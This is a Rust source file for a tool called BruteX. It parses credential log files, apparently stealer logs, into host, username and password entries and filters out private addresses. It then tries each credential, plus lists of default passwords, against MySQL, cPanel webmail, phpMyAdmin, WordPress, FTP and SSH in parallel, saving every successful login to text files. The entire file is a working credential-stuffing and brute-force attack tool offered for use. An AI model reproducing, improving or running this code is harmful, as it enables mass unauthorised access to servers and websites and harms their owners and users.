use ftp::FtpError;
use ftp::FtpStream;

use mysql::*;
use native_dialog::MessageDialog;
use native_dialog::MessageType;
use rayon::iter::IntoParallelIterator;
use rayon::iter::ParallelIterator;
use serde::{Deserialize, Serialize};
use serde_json::de;
use std::collections::hash_map;
use std::collections::HashMap;
use std::collections::HashSet;
use std::error::Error;
use std::io::Read;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::{fs, path::PathBuf, process::exit};
use BruteX::ascii_art;
use BruteX::open_link;
const CONFIG: &str = "config.json";
const MYSQLSUCESS: &str = "mysql_logade_sucess.txt";
const FTP_SUCESS: &str = "ftp_logade_sucess.txt";
const WP_SUCESS: &str = "wp_sucess.txt";
const WEBMAIL_CPANEL: &str = "cpanel_webmail.txt";
const PHPMYADMIN_SUCESS: &str = "phpmyadmin_sucess.txt";
const TIMEOUT: Duration = Duration::from_secs(10);
#[derive(Serialize, Deserialize, Debug)]
struct ConfigJson {
    default_threads: i32,
    openfile_chuks_mb: i32,
    keys_search_logs: Vec<String>,
    default_login: bool,
}

impl ConfigJson {
    pub fn openfile_return_buffer(self, path: PathBuf) -> Result<HashSet<Login>, Box<dyn Error>> {
        let bytes_per_kb = 1024;
        let bytes_per_mb = bytes_per_kb * bytes_per_kb;
        let chunk_size_bytes = (bytes_per_mb * self.openfile_chuks_mb) as usize;
        let mut file = fs::File::open(path)?;

        let mut buffer = vec![0; chunk_size_bytes];
        let mut hashmap_login_search = HashMap::new();
        let mut login_hash_set = HashSet::new();
        let mut keys_search = Box::new(self.keys_search_logs);
        loop {
            let bytes = file.read(&mut buffer)?; // memory ram read
            if bytes == 0 {
                break;
            }

            let buffer_convert_string = String::from_utf8(buffer[..bytes].to_vec());

            match buffer_convert_string {
                Ok(string_read) => {
                    for line in string_read.lines() {
                        for keys_search in keys_search.iter() {
                            let line = line.to_ascii_lowercase();
                            if line.contains(keys_search) {
                                let login = format_line(&line);
                                match login {
                                    Some(struct_login) => {
                                        let response_insert = login_hash_set.insert(struct_login);
                                        if response_insert {
                                            if let None = hashmap_login_search.get(keys_search) {
                                                hashmap_login_search
                                                    .insert(keys_search.to_string(), 1);
                                                continue;
                                            }
                                            *hashmap_login_search
                                                .entry(keys_search.to_string())
                                                .or_insert(0) += 1;
                                        }
                                    }

                                    _ => continue,
                                }
                            }
                        }
                    }
                }
                _ => continue,
            }
        }
        let mut string_lolcat = String::new();
        for (name, value) in hashmap_login_search {
            string_lolcat.push_str(&format!("{} -=> {} \n", name, value));
        }

        colored(&string_lolcat);
        Ok(login_hash_set)
    }
}

fn format_line(str: &str) -> Option<Login> {
    let url_site = extract_domain(str);
    let not_permied = ["192.168", "127.0", "10.0.", "localhost", "10.10.255",  "10.11"];
    if let Some(host) = url_site {
        let split: Vec<&str> = str.split(":").collect();
        let len = split.len();
        if len < 3 {
            return None;
        }

        if not_permied.iter().any(|&prefix| host.contains(prefix)) {
            return None; 
        }
        let user_and_pass = &split[len - 2..];
        return Some(Login {
            host: host,
            user: user_and_pass[0].to_string(),
            password: user_and_pass[1].to_string(),
        });
        //exit(1);
    }

    None
}

use regex::Regex;

fn extract_domain(text: &str) -> Option<String> {
    let re = Regex::new(r"(?i)\b(?:https?://)?([a-z0-9-]+\.[a-z0-9.-]+)\b").unwrap();

    if let Some(captures) = re.captures(text) {
        Some(captures.get(1).map_or("", |m| m.as_str()).to_string())
    } else {
        None
    }
}
// runtime
fn main() -> Result<(), Box<dyn Error>> {
    let animation = std::thread::spawn(|| {
        ascii_art();
        colored("\nRuning\n");
        colored("\nchecking settings ...\n");
        colored("\nSelect Filename\n");
    });
    
    let path_file = openfile();

    let config = open_config();
    let defualt_login = config.default_login;

    let _thread_pool = rayon::ThreadPoolBuilder::new()
        .num_threads(config.default_threads as usize)
        .build_global()
        .unwrap();

    let hashset = config.openfile_return_buffer(path_file).unwrap();

    println!("Total: {}", hashset.len());

    hashset.into_par_iter().for_each(|login| {
       
        
        let _ = mysql_login_(login.clone(), defualt_login);
        let _ = cp_panel_and_webmail(login.clone());
        let _ = phpmyadmin(login.clone());
        let _ = wp_login(login.clone());
        let _ = ftp_login_(login.clone(), defualt_login);
        let _ = sshLogin(login.clone(), defualt_login);
    });
    open_link();
    Ok(())
}

fn colored(text: &str) {
    use lolcrab::Lolcrab;
    use std::io;
    let mut lol = Lolcrab::new(None, None);
    let stdout = io::stdout();
    let mut stdout = stdout.lock();

    lol.colorize_str(&format!("{}\n", text), &mut stdout);
}
// openfile

fn openfile() -> PathBuf {
    use native_dialog::FileDialog;

    if let Ok(Some(filename)) = FileDialog::new()
        .add_filter("Select File Logs", &["txt"])
        .show_open_single_file()
    {
        return filename;
    } else {
        let _ = MessageDialog::new()
            .set_title("Error")
            .set_type(MessageType::Error)
            .set_text("Error opening the file")
            .show_alert();
    }
    eprintln!("I need to file");
    exit(1);
}

#[derive(Debug, PartialEq, Eq, Hash, Clone)]
pub struct Login {
    pub host: String,
    pub user: String,
    pub password: String,
}

pub fn open_config() -> ConfigJson {
    if let Ok(JsonCOnfig) =
        serde_json::from_str::<ConfigJson>(&fs::read_to_string(CONFIG).unwrap_or_else(|s| {
            let _ = MessageDialog::new()
                .set_title("Error")
                .set_type(MessageType::Error)
                .set_text("File Config no exist")
                .show_alert();
            exit(1);
        }))
    {
        return JsonCOnfig;
    }

    let _ = MessageDialog::new()
        .set_title("Error")
        .set_type(MessageType::Error)
        .set_text("Config Incorret")
        .show_alert();
    exit(1);
}
pub fn salvefile(filename: &str, buffer: String) {
    use std::io::Write;
    let mut file = fs::OpenOptions::new()
        .append(true)
        .create(true)
        .write(true)
        .open(filename)
        .unwrap();
    file.write(buffer.as_bytes());
}

fn detect_captcha(response: &str) -> bool {
    let captcha_indicators: HashSet<&str> = [
        "Please verify you're human",
        "I'm not a robot",
        "reCAPTCHA",
        "security challenge",
        "captcha",
        "robot check",
    ]
    .iter()
    .cloned()
    .collect();

    for indicator in captcha_indicators {
        if response.contains(indicator) {
            return true; // CAPTCHA detect
        }
    }
    false
}

pub fn ftp_login_(login: Login, default: bool) -> Result<(), Box<dyn Error>> {
    let default_login_ftp = [
        ("ftp", "ftp"),
        (&login.user, &login.password),
        ("admin", "admin"),
        ("anonymous", "anonymous"),
        ("user", "user"),
        ("Administrator", "Password123"),
        ("root", "root"),
        ("root", &login.password),
    ];
    let mut ftp = FtpStream::connect(format!("{}:21", login.host))?;

    if default {
        for (username, password) in default_login_ftp {
            let response_login = ftp.login(&username, &password);

            match response_login {
                Ok(_) => {
                    let format_login_sucess = format!(
                        "Url: {}\nUsername: {}\nPassword: {}\nPort: 21\n\n",
                        login.host, login.user, login.password
                    );
                    colored(&format_login_sucess);
                    salvefile(FTP_SUCESS, format_login_sucess);
                    return Ok(());
                }
                _ => {
                    colored("Trying Ftp\n");
                    continue;
                }
            }
        }
    } else {
        let ftp = ftp.login(&login.user, &login.password);
        if ftp.is_ok() {
            let format_login_sucess = format!(
                "Url: {}\nUsername: {}\nPassword: {}\nPort: 21\n",
                login.host, login.user, login.password
            );
            colored(&format_login_sucess);
            salvefile(FTP_SUCESS, format_login_sucess);
            return Ok(());
        }

        colored("Trying Ftp\n");
    }

    Ok(())
}

pub fn mysql_login_(login: Login, default: bool) -> () {
    let default_login_mysql = [
        ("root", "root"),
        (&login.user, &login.password),
        ("root", &login.password),
        ("admin", "admin"),
        ("user", "user"),
        ("test", "test"),
        ("guest", "guest"),
        ("dbadmin", "dbadmin"),
        ("mysql", "mysql"),
        ("anonymous", ""),
    ];

    let mysql = mysql::OptsBuilder::new();
    let mut mysql_builds = Vec::new();
    if default {
        for (user, password) in default_login_mysql {
            let build = mysql
                .clone()
                .ip_or_hostname(Some(&login.host))
                .user(Some(user))
                .pass(Some(password))
                .tcp_connect_timeout(Some(TIMEOUT))
                .to_owned();
            mysql_builds.push((user.to_string(), password.to_string(), build));
        }

        for (user, pass, OptBuildMysqlClientConnect) in mysql_builds {
            let pool = Pool::new(OptBuildMysqlClientConnect);

            match pool {
                Ok(v) => {
                    let format_login_sucess = format!(
                        "Mysql\n\nHost: {}\nUsername: {}\nPassword: {}\nPort: 3306\n",
                        login.host, login.user, login.password
                    );
                    colored(&format_login_sucess);
                    salvefile(MYSQLSUCESS, format_login_sucess);
                    return ();
                }
                Err(e) => match e {
                    error::Error::DriverError(e) => {
                        return ();
                    }

                    _ => {
                        continue;
                    }
                },
            }
        }
        colored("Using Default login mysql");
    } else {
        let pool = Pool::new(
            mysql
                .ip_or_hostname(Some(&login.host))
                .user(Some(&login.user))
                .pass(Some(&login.password)),
        );

        match pool {
            Ok(_) => {
                let format_login_sucess = format!(
                    "Mysql\n\nHost: {}\nUsername: {}\nPassword: {}\nPort: 3306\n",
                    login.host, login.user, login.password
                );
                colored(&format_login_sucess);
                salvefile(MYSQLSUCESS, format_login_sucess);
                return ();
            }

            _ => {
                colored("Login Mysql incorret :(");
                return ();
            }
        }
    }
}
use colored::*;
use reqwest::header::HeaderMap;
pub fn wp_login(login: Login) {
    let mut headers = HeaderMap::new();

    headers.append(
        "Referer",
        format!("https://{}/wp-login.php", login.host)
            .parse()
            .unwrap(),
    );

    let mut payload = HashMap::new();
    payload.insert("log", login.user.clone());
    payload.insert("pwd", login.password.clone());
    payload.insert("wp-submit", "Log In".to_string());
    payload.insert("redirect_to", format!("https://{}/wp-admin/", login.host));
    payload.insert("testcookie", "1".to_string());

    let mut client = reqwest::blocking::Client::new();

    let response = client
        .post(format!("https://{}/wp-login.php", login.host))
        .headers(headers)
        .form(&payload)
        .timeout(TIMEOUT)
        .send();

    match response {
        Ok(res) => {
            if res.status() == 200 {
                let response_url = res.url().as_str();

                if response_url.contains("wp-admin") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let save_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.user,
                        login.password.clone()
                    );
                    println!("{}", save_buffer);
                    salvefile(WP_SUCESS, save_buffer);
                }

                if response_url.contains("ashboard") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let save_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.user,
                        login.password
                    );
                    println!("{}", save_buffer);
                    salvefile(WP_SUCESS, save_buffer);
                }

                if response_url.contains("my-account") {
                    println!(
                        "{} {} {}",
                        "[Wordpress] ".bright_cyan(),
                        "[GOOD!]".bright_green(),
                        login.host.bright_white()
                    );

                    let save_buffer = format!(
                        "Host: {}\nUsername: {}\nPassword: {}\n\n",
                        format!("https://{}/wp-login.php", login.host),
                        login.user,
                        login.password
                    );
                    println!("{}", save_buffer);
                    salvefile(WP_SUCESS, save_buffer);
                }

                println!(
                    "{} {} {}",
                    "[Wordpress] ".bright_blue(),
                    "[BAD!]".bright_red(),
                    login.host.bright_white()
                );
                return;
            }
        }

        _ => {}
    }
}

fn cp_panel_and_webmail(login: Login) {
    let mut headers = HeaderMap::new();

    headers.append(
        "Referer",
        format!("https://{}:2096/", login.host).parse().unwrap(),
    );

    let mut payload = HashMap::new();
    payload.insert("user", login.user.clone());
    payload.insert("pass", login.password.clone());
    payload.insert("goto_uri", "/".to_string());

    let mut client = reqwest::blocking::Client::new();

    let response = client
        .post(format!("https://{}:2096/login/?login_only=1", login.host))
        .headers(headers)
        .form(&payload)
        .timeout(TIMEOUT)
        .send();

    match response {
        Ok(res) => {
            let status = res.status();

            let response_url = res;

            let url = response_url.url().as_str();
            let response_text = response_url.text();
            let response_body = response_text.unwrap();

            if response_body.contains("security_token") {
                println!(
                    "{} {} {}",
                    "[CPanel] ".bright_cyan(),
                    "[GOOD!]".bright_green(),
                    login.host.bright_white()
                );

                let save_buffer = format!(
                    "Host: {}\nUsername: {}\nPassword: {}\n\n",
                    format!("https://{}:2083/", login.host),
                    login.user,
                    login.password.clone()
                );
                println!("{}", save_buffer);
                salvefile(WEBMAIL_CPANEL, save_buffer);
            } else {
                let format_message = format!(
                    "{} {} {}",
                    "[CPanel] ".bright_blue(),
                    "[BAD!]\n".bright_red(),
                    login.host.bright_white()
                );
                colored(&format_message);
            }
        }

        _ => {}
    }
}
fn phpmyadmin(login: Login) -> Result<(), Box<dyn std::error::Error>> {
    use reqwest::header::*;
    use scraper::*;

    let url = format!("http://{}/phpmyadmin/index.php", login.host);
    let mut client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true) // Disables SSL certificate validation
        .danger_accept_invalid_hostnames(true) // Disables hostname validation on the certificate
        .timeout(TIMEOUT)
        .build()?;

    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_str(
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
        )?,
    );
    headers.insert(
        ACCEPT,
        HeaderValue::from_str("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")?,
    );
    headers.insert(
        ACCEPT_LANGUAGE,
        HeaderValue::from_str("pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")?,
    );
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_str("application/x-www-form-urlencoded")?,
    );
    headers.insert(ORIGIN, HeaderValue::from_str("null")?);
    headers.insert(CONNECTION, HeaderValue::from_str("keep-alive")?);
    headers.insert(UPGRADE_INSECURE_REQUESTS, HeaderValue::from_str("1")?);
    headers.insert("Priority", "u=0, i".parse().unwrap());

    // Sends the GET request to get the token and cookies
    let response = client
        .post(&url)
        .timeout(Duration::from_secs(10))
        .headers(headers.clone()) // Uses the defined headers
        .send()?;

    let cookies_from_response = &response.cookies().collect::<Vec<_>>();
    let cookie_header_value = cookies_from_response
        .iter()
        .map(|cookie| format!("{}={}", cookie.name(), cookie.value()))
        .collect::<Vec<String>>()
        .join("; ");

    headers.insert("Cookie", HeaderValue::from_str(&cookie_header_value)?); // Sends the cookies

    // Extracts the token from the HTML response using regex
    let response_body = response.text()?;

    let document = Html::parse_document(&response_body);
    let value_selector = Selector::parse("[value]").unwrap();
    let mut hashmap = HashMap::new();

    for element in document.select(&value_selector) {
        if let Some(name) = element.value().attr("name") {
            if let Some(value) = element.value().attr("value") {
                if value.len() == 0 {
                    continue;
                } else {
                    hashmap.insert(name, value);
                }
            }
        }
    }

    hashmap.insert("pma_username", &login.user);
    hashmap.insert("pma_password", &login.password);

    let send_response = client.post(&url).headers(headers).form(&hashmap).send()?;

    let redirect_url = send_response.url().as_str();

    if redirect_url.contains("token") {
        let format_message = format!(
            "url: {}\nUsername: {}\nPassword: {}\n\n",
            url, login.user, login.password
        );
        colored(&format_message);
        salvefile(PHPMYADMIN_SUCESS, format_message);
    } else {
        println!("PhpMyAdmin Check  > {}", url);
    }

    Ok(())
}
use std::net::ToSocketAddrs;

 


fn sshLogin(login: Login, default: bool) -> Result<(), Box<dyn Error>> {
    
    let host = login.host;
    println!("Bruteforce SSH: {}", host);
    let port = 22;
    //let tcp_connect = TcpStream::connect(format!("{host}:{port}"))?;
    let socket_addr = format!("{host}:{port}")
    .to_socket_addrs()?
    .next()
    .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "@federatic"))?;


let tcp_connect = TcpStream::connect_timeout(&socket_addr, Duration::from_secs(10))?;

    tcp_connect.set_read_timeout(Some(Duration::new(10, 0)))?;
    tcp_connect.set_write_timeout(Some(Duration::new(10, 0)))?;

    let user = login.user.as_str();

    let  password = login.password.as_str();

    let logins_default = [("root",password.clone()), (user.clone(), password.clone())];

    if default {
        let mut session = Session::new()?;
        session.set_tcp_stream(tcp_connect);
        session.set_timeout(10_000);
        let session_handshake = session.handshake();
        if let Err(s) = session_handshake {
            println!("{}", s.to_string());
            return Ok(());
        }
        for (user, pass) in logins_default{
            let response  = session.userauth_password(&user, pass);
            if let Err(ok) =   response{
                println!("{}", ok.to_string());
        }   
        else {
            if session.authenticated() {
                println!("Ssh logad");
                salvefile("sshlogade.txt", format!("Host: {host}\nPort: {port}\nUsername:{user}\nPassword:{password}\n"));
           
            } 
        }

        }
        

    } else {
        let mut session = Session::new()?;
        session.set_tcp_stream(tcp_connect);
        let session_handshake = session.handshake();
        if let Err(s) = session_handshake {
            println!("handshake Error : {}", s.to_string());
            return Ok(());
        }

        let v = session.userauth_password(user, password);
        if let Err(ok) =   v{
                println!("{}", ok.to_string());
        }   
        else {
            if session.authenticated() {
                println!("Ssh logad");
                salvefile("sshlogade.txt", format!("Host: {host}\nPort: {port}\nUsername:{user}\nPassword:{password}\n"));
           
            } 
        }

        }   

    Ok(())
}

use ssh2::Session;
use std::io::prelude::*;
use std::net::TcpStream;
